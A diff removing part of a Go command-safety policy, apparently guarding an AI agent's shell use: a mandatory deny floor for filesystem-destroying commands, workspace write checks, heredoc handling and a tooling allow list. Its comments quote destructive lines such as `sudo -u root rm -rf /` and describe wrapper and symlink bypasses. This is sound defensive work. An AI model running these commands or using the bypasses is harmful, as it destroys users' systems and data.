-			return scanSegment(tokens[i+2:], dir, fromNested)
-		}
-
-		// The wrapper's program. It keeps the command position open for what follows.
-		if commandWrappers[name] {
-			wrapper, valueNext = name, false
-			continue
-		}
-
-		expectCommand = false
-	}
-	return Decision{}, false
-}
-
-// wrapperValueFlags lists, per wrapper, the options that consume the NEXT token as their
-// value. Without it the value of a wrapper's option is mistaken for the program it wraps:
-// `sudo -u root rm -rf /` would be read as a program called `root`, and the floor would be
-// bypassed by choosing a different user to run as.
-//
-// A flag absent from this table is one that stands alone (`sudo -n`, `nice -f`), so the token
-// after it is still in command position.
-var wrapperValueFlags = map[string]map[string]bool{
-	"sudo": {
-		"-u": true, "--user": true, "-g": true, "--group": true,
-		"-p": true, "--prompt": true, "-C": true, "--close-from": true,
-		"-h": true, "--host": true, "-r": true, "--role": true,
-		"-t": true, "--type": true, "-R": true, "--chroot": true,
-		"-T": true, "--command-timeout": true,
-	},
-	"doas": {"-u": true, "-C": true},
-	"nice": {"-n": true, "--adjustment": true},
-	"ionice": {"-c": true, "--class": true, "-n": true, "--classdata": true,
-		"-p": true, "--pid": true},
-	"stdbuf": {"-i": true, "--input": true, "-o": true, "--output": true,
-		"-e": true, "--error": true},
-	"time": {"-f": true, "--format": true, "-o": true, "--output": true},
-	"env": {"-u": true, "--unset": true, "-C": true, "--chdir": true,
-		"-S": true, "--split-string": true},
-	// `nohup` and `command` take no option with a value.
-}
-
-// destructiveVerb reports whether a floor program is being asked to destroy with no operand
-// of its own, which only matters when an introducer supplies those operands.
-//
-// Only `rm` and `dd` are here, and that is not an omission: the other floor programs
-// (`mkfs`, `shred`, `wipefs`, the partition editors) are refused by mandatory() whatever
-// their operands say, so a line naming one of them never reaches this question. Keeping a
-// case for them would be unreachable code that reads like a safety net.
-func destructiveVerb(name string, args []string) bool {
-	switch name {
-	case "rm":
-		return hasFlag(args, 'r') && hasFlag(args, 'f') && len(rmTargets(args)) == 0
-	case "dd":
-		return !hasArgWithPrefix(args, "of=")
-	}
-	return false
-}
-
-// hasFlag reports whether a short-option cluster contains a flag character.
-func hasFlag(args []string, flag rune) bool {
-	for _, a := range args {
-		if strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--") && strings.ContainsRune(a, flag) {
-			return true
-		}
-	}
-	return false
-}
-
-// lineArgs returns everything after the program, stopping only at a command separator.
-//
-// It is the counterpart of commandArgs, and the difference between them is the difference
-// between two questions. commandArgs asks "what arguments does THIS program get?" and stops
-// at a wrapper or an introducer, because `sudo rm -rf /` hands `rm` no arguments at all — the
-// wrapper that follows belongs to the next program. lineArgs asks "what does the line say
-// about what this program touches?", and there the operands of a wrapper do count:
-// `xargs rm -rf build` does name `build`, and refusing it as a target-less delete would be
-// wrong about the line in front of the user.
-//
-// A separator ends both, because after one the words belong to another command.
-func lineArgs(tokens []string, from int) []string {
-	out := make([]string, 0, len(tokens)-from)
-	for _, t := range tokens[from:] {
-		if isSeparatorToken(t) {
-			break
-		}
-		out = append(out, t)
-	}
-	return out
-}
-
-// commandArgs trims what follows a program down to its own arguments, stopping at the first
-// token that begins another command. Without it, `rm -rf a; rm -rf /` would hand the first
-// rm the arguments of the second.
-func commandArgs(rest []string) []string {
-	out := make([]string, 0, len(rest))
-	for _, t := range rest {
-		if isSeparatorToken(t) || nestedIntroducers[baseName(t)] || commandWrappers[baseName(t)] {
-			break
-		}
-		out = append(out, t)
-	}
-	return out
-}
-
-func isShellName(name string) bool {
-	switch name {
-	case "sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "fish", "ash", "busybox":
-		return true
-	}
-	return false
-}
-
-// mandatory answers the commands that are refused whatever the operator chose.
-//
-// The test for membership is not "is this dangerous". Almost everything is dangerous
-// somewhere, and a floor that grows to cover it becomes a policy nobody can work under,
-// which is a policy everybody turns off. The test is narrower and it is two questions:
-//
-//	does it destroy something that cannot be recovered, and
-//	is the honest answer of a program running in somebody's home directory "never"?
-//
-// By that test: erasing a filesystem, the system's power state, the partition table, and a
-// recursive forced delete of a root-like path. Everything else — including `rm -rf` of a
-// project directory, which is exactly what a cleanup task is asked to do — is a
-// confirmation, not a floor.
-//
-// The floor is enforced structurally rather than by good intentions:
-//
-//   - MandatoryInLine checks it before anything is classified, so no argument trick reaches
-//     it late and no shell hides it;
-//   - Relaxing refuses to touch a Mandatory decision, so `enforce: false` cannot reach it;
-//   - the config layer has no setting that names it (see config.Policy).
-func mandatory(name string, args []string, dir string) (Decision, bool) {
-	switch name {
-	case "mkfs", "mkfs.ext2", "mkfs.ext3", "mkfs.ext4", "mkfs.xfs", "mkfs.btrfs", "mkfs.vfat":
-		return mandatoryDeny(name, "formatting a filesystem destroys everything on it and cannot be undone")
-	case "fdisk", "sfdisk", "cfdisk", "parted", "gdisk", "sgdisk":
-		return mandatoryDeny(name, "editing the partition table can destroy every filesystem on the disk")
-	case "dd":
-		// dd with an output target overwrites it, block for block, with no undo and no
-		// confirmation of its own. A dd that only reads (`if=` and no `of=`) is untouched.
-		if hasArgWithPrefix(args, "of=") {
-			return mandatoryDeny(name, "writing to a device or file with dd overwrites it block for block")
-		}
-	case "shutdown", "reboot", "halt", "poweroff", "init":
-		return mandatoryDeny(name, "the machine's power state is not the agent's to decide")
-	case "wipefs", "blkdiscard", "shred":
-		return mandatoryDeny(name, "this destroys data on a device with no recovery")
-	case "rm":
-		// A recursive, forced delete of a root-like path. This is the case the floor exists
-		// for: `rm -rf .` inside a workspace is a confirmation, and `rm -rf /` is not a
-		// thing anybody means to do.
-		if reason, bad := recursiveRootRemoval(args, dir); bad {
-			return mandatoryDeny(name, reason)
-		}
-	case "mv", "cp", "install", "ln":
-		// The same command with a root-like target is the same destruction by another
-		// route: `mv / x` and `ln -s / enlace` are not work, and neither is overwriting the
-		// tree that contains the machine.
-		if reason, bad := rootLikeTarget(args, dir); bad {
-			return mandatoryDeny(name, reason)
-		}
-	}
-	return Decision{}, false
-}
-
-// rootLikeTarget reports whether any operand of the command names a tree the agent must not
-// touch, whatever the verb is. `rm` and `mv` reach the same place from different directions.
-func rootLikeTarget(args []string, dir string) (string, bool) {
-	for _, target := range rmTargets(args) {
-		if isRootLike(target, dir) {
-			return fmt.Sprintf("the command targets %q, which is not a directory inside the workspace "+
-				"but a tree the agent must not touch", target), true
-		}
-	}
-	return "", false
-}
-
-func mandatoryDeny(command, reason string) (Decision, bool) {
-	return Decision{
-		Verdict:   Deny,
-		Reason:    fmt.Sprintf("refused: %s (`%s`). This is not something the policy can be configured to allow", reason, command),
-		Rule:      "mandatory",
-		Mandatory: true,
-	}, true
-}
-
-// hasArgWithPrefix reports whether any argument starts with prefix, which is how dd's `of=`
-// target is found without parsing the whole operand grammar.
-func hasArgWithPrefix(args []string, prefix string) bool {
-	for _, a := range args {
-		if strings.HasPrefix(a, prefix) {
-			return true
-		}
-	}
-	return false
-}
-
-// recursiveRootRemoval reports whether this is an `rm -r -f` whose target is a root, a home
-// directory, or the tree above the workspace.
-//
-// A relative "." is NOT root-like: it is the project the user pointed the agent at,
-// deleting it is a thing people ask for, and the workspace rule treats it as ordinary
-// consequential work.
-func recursiveRootRemoval(args []string, dir string) (string, bool) {
-	recursive, force := false, false
-	for _, a := range args {
-		switch {
-		case a == "--recursive":
-			recursive = true
-		case a == "--force":
-			force = true
-		case strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--"):
-			if strings.ContainsRune(a, 'r') || strings.ContainsRune(a, 'R') {
-				recursive = true
-			}
-			if strings.ContainsRune(a, 'f') {
-				force = true
-			}
-		}
-	}
-	if !recursive || !force {
-		return "", false
-	}
-	for _, target := range rmTargets(args) {
-		if isRootLike(target, dir) {
-			return fmt.Sprintf("`rm` deletes %q, which is not a directory inside the workspace but a "+
-				"tree the agent must not remove", target), true
-		}
-	}
-	return "", false
-}
-
-// rmTargets returns the operands of an rm-like command: everything that is not the program
-// and not an option. A `--` terminator is honoured, because `rm -rf -- -weird-name` has one
-// operand and it is not an option.
-func rmTargets(args []string) []string {
-	var out []string
-	afterTerminator := false
-	for _, a := range args {
-		if afterTerminator {
-			out = append(out, a)
-			continue
-		}
-		if a == "--" {
-			afterTerminator = true
-			continue
-		}
-		if strings.HasPrefix(a, "-") && a != "-" {
-			continue
-		}
-		out = append(out, a)
-	}
-	return out
-}
-
-// isRootLike reports whether a path names something whose deletion is not local work.
-//
-// The comparison is on the RESOLVED path, because `..` and a symlink are the two ways a
-// path that reads as local points at something that is not. A path that cannot be resolved
-// (it does not exist) is compared as written: there is nothing to resolve, and refusing to
-// decide would be the wrong way round for a rule whose whole job is to be sure.
-func isRootLike(target, dir string) bool {
-	t := strings.TrimSpace(target)
-	if t == "" {
-		return false
-	}
-	if t == "/" || t == "/*" {
-		return true
-	}
-	// A home directory is never local work, whether it is written with a tilde or with its
-	// path. The tilde is checked as written because resolving it would mean asking which
-	// user the agent runs as, and that is exactly the thing that must not decide.
-	if t == "~" || t == "~/" || strings.HasPrefix(t, "~/") {
-		return true
-	}
-	abs := t
-	if !filepath.IsAbs(abs) && dir != "" {
-		abs = filepath.Join(dir, abs)
-	}
-	if resolved, err := filepath.EvalSymlinks(abs); err == nil {
-		abs = resolved
-	}
-	abs = filepath.Clean(abs)
-
-	switch abs {
-	case "/", "/home", "/root", "/etc", "/usr", "/var", "/bin", "/boot", "/lib", "/opt", "/srv":
-		return true
-	}
-	// A home directory itself, which is the other thing that is never local work.
-	if rest, ok := strings.CutPrefix(abs, "/home/"); ok && !strings.ContainsRune(rest, '/') {
-		return true
-	}
-	// The tree above the workspace: its parent, and everything further up. A path inside
-	// the workspace is local work; the directory that CONTAINS the work is not.
-	if dir != "" {
-		base := dir
-		if resolved, err := filepath.EvalSymlinks(base); err == nil {
-			base = resolved
-		}
-		base = filepath.Clean(base)
-		if abs != base && strings.HasPrefix(base, abs+string(filepath.Separator)) {
-			return true
-		}
-	}
-	return false
-}
-
-// ---------------------------------------------------------------------------
-// Where a write lands
-// ---------------------------------------------------------------------------
-
-// writingForm decides the writers whose arguments say WHERE the change goes.
-//
-// The rule is the one a person would use: inside the directory the user pointed the agent
-// at is work; outside it is a confirmation. The workspace is not a wall — the agent is
-// often asked to touch a sibling — but crossing it is exactly the moment a person would
-// want to be asked, and it is the only moment this package is trying to find.
-//
-// It returns false when the command's arguments do not locate the change at all, leaving
-// the caller to give the unclassified answer. That keeps "I could not tell" separate from
-// "I checked and it is outside".
-func writingForm(command string, args []string, dir string) (Decision, bool) {
-	name := baseName(command)
-	targets := writeTargets(name, args)
-	if len(targets) == 0 {
-		return Decision{}, false
-	}
-	if outside := firstOutside(targets, dir); outside != "" {
-		return Decision{Ask, fmt.Sprintf("%q writes to %q, which is outside the directory this task "+
-			"works in (%s)", name, outside, dir), "write-outside-workspace", false}, true
-	}
-	return Decision{Allow, fmt.Sprintf("%q writes inside the workspace (%s)", name, dir), "write-inside-workspace", false}, true
-}
-
-// writeTargets extracts the operands of the writers whose destination is in their
-// arguments. The ones whose destination is decided by flags (`git` writing the index,
-// `systemctl` changing a unit) are not here: they have no operand that locates the change,
-// and they are answered by the unclassified rule rather than being guessed at.
-func writeTargets(name string, args []string) []string {
-	operands := rmTargets(args)
-	switch name {
-	case "chmod", "chown", "chgrp":
-		// The first operand is a mode or an owner, not a path: reading `chmod 644` as
-		// "writes to the file 644" is how a policy invents a target and then reports it
-		// as being outside the workspace.
-		if len(operands) > 0 {
-			operands = operands[1:]
-		}
-	case "rm", "rmdir", "mkdir", "touch", "truncate", "tee", "mkfifo", "mknod":
-		// Everything the command names is written to, which is what rmTargets already
-		// returned.
-	case "mv", "cp", "ln", "install":
-		// The LAST operand is where it lands; the ones before it are what is moved, and
-		// moving something is harmless next to writing where it is moved to. A flag's own
-		// value (`install -m 755 a dst`) sits before the destination and does not change
-		// which operand is last.
-		if len(operands) > 0 {
-			operands = operands[len(operands)-1:]
-		}
-	default:
-		return nil
-	}
-	return operands
-}
-
-// isRootWriteTarget decides whether a path that is about to be WRITTEN is one the agent must
-// never write, whatever the operator chose.
-//
-// It is the write-side counterpart of isRootLike, and it is separate because the two ask
-// different questions: isRootLike asks "may this be deleted", which is about trees; this asks
-// "may this be overwritten", which is about a single file inside a system tree. `/etc/passwd`
-// is the second without being the first.
-func isRootWriteTarget(target string) bool {
-	t := strings.TrimSpace(target)
-	if t == "" {
-		return false
-	}
-	if isHarmlessDevice(t) {
-		return false
-	}
-	if t == "/" || t == "~" || t == "~/" || strings.HasPrefix(t, "~/") {
-		return true
-	}
-	abs := t
-	if resolved, err := filepath.EvalSymlinks(abs); err == nil {
-		abs = resolved
-	}
-	abs = filepath.Clean(abs)
-	for _, tree := range []string{"/etc", "/usr", "/bin", "/sbin", "/boot", "/lib", "/lib64", "/var", "/root", "/opt", "/srv"} {
-		if abs == tree || strings.HasPrefix(abs, tree+string(filepath.Separator)) {
-			return true
-		}
-	}
-	return false
-}
-
-// isHarmlessDevice reports whether a device path is one of the streams or the null device,
-// where writing goes nowhere or straight to a terminal the user is looking at.
-//
-// The distinction matters because the alternative is a policy that refuses `> /dev/null`,
-// which appears in shell code constantly, and a policy that cries wolf on the common case is
-// switched off before it ever protects anything.
-func isHarmlessDevice(path string) bool {
-	switch strings.TrimSuffix(path, "/") {
-	case "/dev/null", "/dev/zero", "/dev/stdout", "/dev/stderr", "/dev/tty", "/dev/full":
-		return true
-	}
-	// `/dev/fd/N` and `/dev/pts/N` are a descriptor and a terminal, not a disk.
-	return strings.HasPrefix(path, "/dev/fd/") || strings.HasPrefix(path, "/dev/pts/")
-}
-
-// firstOutside returns the first target that resolves outside dir, or "" when every one of
-// them is inside.
-//
-// A target that does not exist yet (a file about to be created) is resolved as far as it
-// can be: the deepest ancestor that does exist is followed through its links, and the
-// remaining path is re-joined to it. Stopping at "the file is not there, so use it as
-// written" is how a symlink INSIDE the workspace becomes a way to write outside it — the
-// link is the part that exists, and it is the part that says where the write really lands.
-func firstOutside(targets []string, dir string) string {
-	if dir == "" {
-		return ""
-	}
-	base := filepath.Clean(dir)
-	if !filepath.IsAbs(base) {
-		// firstOutside compares ABSOLUTE paths, so a relative workspace is resolved against
-		// the process's own directory first. A caller is expected to hand in an absolute
-		// workspace; this keeps the comparison from silently treating every target as
-		// outside when it does not.
-		if abs, err := filepath.Abs(base); err == nil {
-			base = abs
-		}
-	}
-	// The workspace itself is resolved once: a workspace reached through a link must not
-	// make every path inside it look like it is outside.
-	if resolved, err := filepath.EvalSymlinks(base); err == nil {
-		base = resolved
-	}
-	for _, t := range targets {
-		t = strings.TrimSpace(t)
-		if t == "" {
-			continue
-		}
-		if strings.HasPrefix(t, "~") {
-			// A home path written with a tilde is outside by construction.
-			return t
-		}
-		abs := t
-		if !filepath.IsAbs(abs) {
-			abs = filepath.Join(base, abs)
-		}
-		abs = resolveAsFarAsPossible(abs)
-		if abs != base && !strings.HasPrefix(abs, base+string(filepath.Separator)) {
-			return t
-		}
-	}
-	return ""
-}
-
-// resolveAsFarAsPossible resolves the links of the deepest part of a path that exists, and
-// re-joins the part that does not.
-//
-// The walk is bounded by the root, and the root is always resolvable, so the loop always
-// terminates by finding an ancestor that exists: either the path exists, or one of its
-// parents does, or the root does.
-func resolveAsFarAsPossible(abs string) string {
-	if resolved, err := filepath.EvalSymlinks(abs); err == nil {
-		return filepath.Clean(resolved)
-	}
-	remainder := ""
-	current := filepath.Clean(abs)
-	for {
-		parent := filepath.Dir(current)
-		remainder = filepath.Join(filepath.Base(current), remainder)
-		current = parent
-		if resolved, err := filepath.EvalSymlinks(current); err == nil {
-			return filepath.Clean(filepath.Join(resolved, remainder))
-		}
-	}
-}
-
-// ---------------------------------------------------------------------------
-// Heredocs
-// ---------------------------------------------------------------------------
-
-// heredoc is one `<< DELIM` body found in a line.
-type heredoc struct {
-	delim string
-	// quoted is true for <<'EOF', <<"EOF" and <<\EOF: the shell then expands nothing in the body.
-	quoted bool
-	body   string
-}
-
-// splitHeredocs takes the bodies of heredocs out of a line. It returns the line WITHOUT them (the
-// `<< DELIM` operator stays, so the segment reader still sees an input redirection) and the
-// bodies, each with its delimiter.
-//
-// It is a scanner and not a parser, like the rest of this file: quotes are tracked so that a `<<`
-// inside a string is not an operator, and a body ends at the first line that is exactly its
-// delimiter (leading tabs ignored for `<<-`). A body with no closing line runs to the end of
-// the line, which is what the shell does too.
-func splitHeredocs(line string) (string, []heredoc) {
-	if !strings.Contains(line, "<<") {
-		return line, nil
-	}
-	type pending struct {
-		delim         string
-		quoted, strip bool
-	}
-	var (
-		out    strings.Builder
-		docs   []heredoc
-		queue  []pending
-		quote  rune
-		runes  = []rune(line)
-		escape bool
-	)
-	for i := 0; i < len(runes); i++ {
-		r := runes[i]
-		switch {
-		case escape:
-			escape = false
-		case r == '\\' && quote != '\'':
-			escape = true
-		case quote != 0:
-			if r == quote {
-				quote = 0
-			}
-		case r == '\'' || r == '"':
-			quote = r
-		case r == '<' && i+1 < len(runes) && runes[i+1] == '<' && (i+2 >= len(runes) || runes[i+2] != '<'):
-			// `<<` (a here-STRING is `<<<`, which has no body).
-			j := i + 2
-			strip := false
-			if j < len(runes) && runes[j] == '-' {
-				strip = true
-				j++
-			}
-			for j < len(runes) && (runes[j] == ' ' || runes[j] == '\t') {
-				j++
-			}
-			var d strings.Builder
-			quoted := false
-			for j < len(runes) && !strings.ContainsRune(" \t\n;|&()<>", runes[j]) {
-				switch runes[j] {
-				case '\'', '"', '\\':
-					quoted = true
-				default:
-					d.WriteRune(runes[j])
-				}
-				j++
-			}
-			if d.Len() > 0 {
-				queue = append(queue, pending{d.String(), quoted, strip})
-			}
-			out.WriteString(string(runes[i:j]))
-			i = j - 1
-			continue
-		case r == '\n' && len(queue) > 0:
-			out.WriteRune(r)
-			rest := string(runes[i+1:])
-			consumed := 0
-			for _, h := range queue {
-				var body strings.Builder
-				for consumed < len(rest) {
-					nl := strings.IndexByte(rest[consumed:], '\n')
-					var ln string
-					if nl < 0 {
-						ln, nl = rest[consumed:], len(rest)-consumed
-					} else {
-						ln = rest[consumed : consumed+nl]
-					}
-					consumed += nl + 1
-					if consumed > len(rest) {
-						consumed = len(rest)
-					}
-					cmp := strings.TrimRight(ln, "\r")
-					if h.strip {
-						cmp = strings.TrimLeft(cmp, "\t")
-					}
-					if cmp == h.delim {
-						break
-					}
-					body.WriteString(ln + "\n")
-				}
-				docs = append(docs, heredoc{delim: h.delim, quoted: h.quoted, body: body.String()})
-			}
-			queue = nil
-			i += len([]rune(rest[:consumed]))
-			continue
-		}
-		out.WriteRune(r)
-	}
-	return out.String(), docs
-}
-
-// heredocVerdict judges what a heredoc body can do. The body is text; it becomes a danger only
-// when something EXECUTES it, and there are two ways it can:
-//
-//   - the receiving program is an interpreter or a shell (`sh << EOF`, `python3 - << EOF`,
-//     `node - << EOF`): the body is then a program given as text, exactly like `python3 -c`, and
-//     is offered to the user whole;
-//   - the delimiter is unquoted and the body has `$(...)` or a backtick: the shell runs that
-//     substitution while it expands the body, before any program sees it.
-//
-// Writing text into a file (`cat > f << 'EOF'`, `tee f << EOF`) is neither, and is judged by the
-// redirection and the program like any other write.
-func (m Mode) heredocVerdict(main string, docs []heredoc) (Decision, bool) {
-	if len(docs) == 0 {
-		return Decision{}, false
-	}
-	for _, seg := range lineSegments(main) {
-		if seg.redirect {
-			continue
-		}
-		words, syntax := stripShellKeyword(seg.words)
-		if syntax || len(words) == 0 {
-			continue
-		}
-		name := baseName(unquote(words[0]))
-		if interpreters[name] || name == "sh" || name == "bash" || name == "zsh" || name == "dash" ||
-			name == "ksh" || name == "fish" || name == "eval" || name == "source" || name == "." {
-			return m.unclassified(fmt.Sprintf("%q is given a program as a heredoc, and text that is "+
-				"run cannot be checked", name), "heredoc-program"), true
-		}
-	}
-	for _, d := range docs {
-		if !d.quoted && (strings.Contains(d.body, "$(") || strings.Contains(d.body, "`")) {
-			return m.unclassified("a heredoc with an unquoted delimiter runs the substitutions in its body",
-				"heredoc-substitution"), true
-		}
-	}
-	return Decision{}, false
-}
-
-// ---------------------------------------------------------------------------
-// The project's own tooling
-// ---------------------------------------------------------------------------
-
-// devTools are the programs `npx` and its kin run that belong to a project's own toolchain. Any
-// OTHER package `npx` would fetch is unreviewed code from the network, and is still asked about.
-var devTools = map[string]bool{
-	"vitest": true, "jest": true, "tsc": true, "eslint": true, "prettier": true, "next": true,
-	"vite": true, "tsx": true, "ts-node": true, "mocha": true, "playwright": true, "cypress": true,
-	"biome": true, "stylelint": true, "turbo": true, "nx": true, "webpack": true, "rollup": true,
-	"esbuild": true, "svelte-check": true, "vue-tsc": true, "astro": true, "nuxt": true, "c8": true,
-	"nyc": true, "ava": true, "tap": true, "knip": true, "depcheck": true, "prisma": true,
-	"drizzle-kit": true, "tailwindcss": true, "postcss": true, "sass": true, "storybook": true,
-	"expo": true, "ng": true, "remix": true,
-}
-
-// projectToolDecision allows two families of command that every project needs and that the
-// default classification would ask about:
-//
-//   - a dependency install that takes its list FROM THE MANIFEST: `npm ci`, `npm install`,
-//     `yarn`, `pnpm install`, `pip install -r requirements.txt`, `pip install -e .`,
-//     `go mod download`, `bundle install`, `composer install`, `poetry install`, `uv sync`. What
-//     gets installed is what the project already declares, and stays in the project. Naming a
-//     package (`npm install left-pad`), a global install (`-g`) and anything with a privilege
-//     wrapper are not this and still go to the user.
-//   - `npx` (and `pnpm exec`) running one of the project's own dev tools.
-func projectToolDecision(name string, args []string) (Decision, bool) {
-	allow := func(what string) (Decision, bool) {
-		return Decision{Allow, fmt.Sprintf("%s installs or runs what the project itself declares", what),
-			"project-tooling", false}, true
-	}
-	var positional []string
-	global, fromFile := false, false
-	for i := 0; i < len(args); i++ {
-		a := args[i]
-		switch {
-		case a == "-g" || a == "--global" || a == "--prefix" || a == "--user" || a == "--target" ||
-			a == "--registry" || a == "--index-url" || a == "--extra-index-url" || a == "-i" ||
-			strings.HasPrefix(a, "--registry=") || strings.HasPrefix(a, "--index-url=") ||
-			strings.HasPrefix(a, "--extra-index-url=") || strings.HasPrefix(a, "--prefix="):
-			global = true
-		case a == "-r" || a == "--requirement" || a == "-e" || a == "--editable" || a == "-c" || a == "--constraint":
-			// The value is a file or a path in the project, not a package name.
-			fromFile = a != "-c" && a != "--constraint"
-			i++
-		case strings.HasPrefix(a, "-r") && len(a) > 2 && !strings.HasPrefix(a, "--"):
-			fromFile = true
-		case !strings.HasPrefix(a, "-"):
-			positional = append(positional, a)
-		}
-	}
-	if global {
-		return Decision{}, false
-	}
-	sub := ""
-	if len(positional) > 0 {
-		sub = positional[0]
-	}
-	switch name {
-	case "npm":
-		if sub == "ci" || sub == "clean-install" || ((sub == "install" || sub == "i") && len(positional) == 1) {
-			return allow("npm")
-		}
-	case "yarn":
-		if len(positional) == 0 || (sub == "install" && len(positional) == 1) {
-			return allow("yarn")
-		}
-	case "pnpm":
-		if (sub == "install" || sub == "i") && len(positional) == 1 {
-			return allow("pnpm")
-		}
-		if sub == "exec" && len(positional) >= 2 && devTools[baseName(positional[1])] {
-			return allow("pnpm exec")
-		}
-	case "bun":
-		if (sub == "install" || sub == "i") && len(positional) == 1 {
-			return allow("bun")
-		}
-	case "pip", "pip3":
-		if sub == "install" && len(positional) == 1 && fromFile {
-			return allow("pip")
-		}
-		if sub == "install" && len(positional) == 2 && positional[1] == "." {
-			return allow("pip")
-		}
-	case "go":
-		if sub == "mod" && len(positional) == 2 && (positional[1] == "download" || positional[1] == "tidy" || positional[1] == "verify") {
-			return allow("go mod")
-		}
-	case "bundle", "composer", "poetry":
-		if sub == "install" && len(positional) == 1 {
-			return allow(name)
-		}
-	case "uv":
-		if sub == "sync" && len(positional) == 1 {
-			return allow("uv")
-		}
-	case "cargo":
-		if sub == "fetch" && len(positional) == 1 {
-			return allow("cargo")
-		}
-	case "npx":
-		// `npx --no-install tool`, `npx -y tool`, `npx tool args`: the first non-flag is the tool.
-		if len(positional) > 0 && devTools[baseName(positional[0])] {
-			return allow("npx " + baseName(positional[0]))
-		}
-	}
-	return Decision{}, false
 }
